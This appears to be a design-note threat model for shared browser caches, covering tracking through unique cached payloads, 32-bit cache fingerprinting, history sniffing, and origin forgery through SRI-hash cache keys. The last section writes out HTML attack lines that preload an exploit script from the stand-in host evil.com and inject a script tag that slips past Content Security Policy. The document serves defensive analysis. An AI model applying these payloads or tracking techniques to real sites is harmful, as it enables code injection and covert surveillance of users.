# Privacy Risks with Shared Web Resources

This is a collection of the known privacy risks associated with storing web resources in a shared browser cache.

## Unique Payload

The contents in a file in a shared cache can be used as a tracking vector similar to cookies by embedding a unique payload in the file. For example, `https://example.com/uid` can be configured to return a unique value every time it is accessed and set a long cache lifetime on the response. Any page that requests `https://example.com/uid` will get the unique ID from the shared cache.

This risk can be mitigated by requiring the use of [Subresource Integrity](countermeasures.md#subresource-integrity-sri).

## Fingerprinting

If the shared cache can be probed for the existence of a file (and it is best to assume that it can be), then each file can proved 1-bit of information to an attacker. By using 32 unique files, say `https://example.com/uid/1` through `https://example.com/uid/32`, an attacker can generate a unique 32-bit identifier for a given user, set the bits by storing the relevant files and then probe for the ID by checking for the existence of each of the 32 URLs to regenerate the 32-bit unique ID.

## History Sniffing

Being able to probe the shared cache for resources can leak information about the user. This can be a variety of things, including things that may not obviously appear to be a risk but that may still be sensitive to a specific user:

* The authentication provider they use may be identified by locating resources in cache that are unique to that authentication provider. This could be abused to make a phishing attack more effective.
* The bank a user uses could be sniffed in a similar way, making financial attacks more effective.
* The user's location or areas of interest may be leaked by identifying specific map tiles in a shared cache.

## SRI-Addressing

It is tempting to de-dupe the same resource across origins by using the hash of the contents as a cache key in a shared cache (allowing for jquery to be shared for example).

Using the integrity hash of a resource as the cache key in a shared resource cache comes with a significant risk of being able to forge the origin of a resource, allowing for a bypass of ]Content Security Policy](https://www.w3.org/TR/CSP3/) protections.

i.e. Let's say that the integrity hash of a javascript exploit script (`exploit.js`) is `sha256-12345` and you are using a browser where the resource hash, when available, is used as the cache key in a shared cache for a resource.

1. An attacher can stuff the script into the shared cache by loading `<link rel=preload as=script href="https://evil.com/exploit.js" integrity="sha256-12345">`
1. On some other site (`example.com`), say with a cross-site scripting vulnerability and CSP protections to only allow same-origin scripts, the attacker injects `<script src="https://example.com/analytics.js" integrity="sha256-12345">`
1. The browser finds `exploit.js` in the cache with the matching integrity hash of `sha256-12345` and returns it as if it were the contents of `https://example.com/analytics.js` (even if the file does not exist on the origin).
1. Since the result of analytics.js is same-origin, it passes the CSP protections and executes `exploit.js` as if it was on the same origin as the site being attacked.

# References

* [Subresource Integrity Addressable Caching](https://hillbrad.github.io/sri-addressable-caching/sri-addressable-caching.html) - Privacy and risks with using SRI to index caches (most of which apply to shared caches as well).
* [W3C - Consider shared caching](https://github.com/w3c/webappsec-subresource-integrity/issues/22) - Discussion on implementing shared caching.
* [Cache and Prizes](https://infrequently.org/2022/03/cache-and-prizes/) - Discussion on the ecosystem risks of favoring "popular" resources.
* [Chrome http cache partitioning](https://github.com/shivanigithub/http-cache-partitioning) - Discusses the current partitioning scheme and background.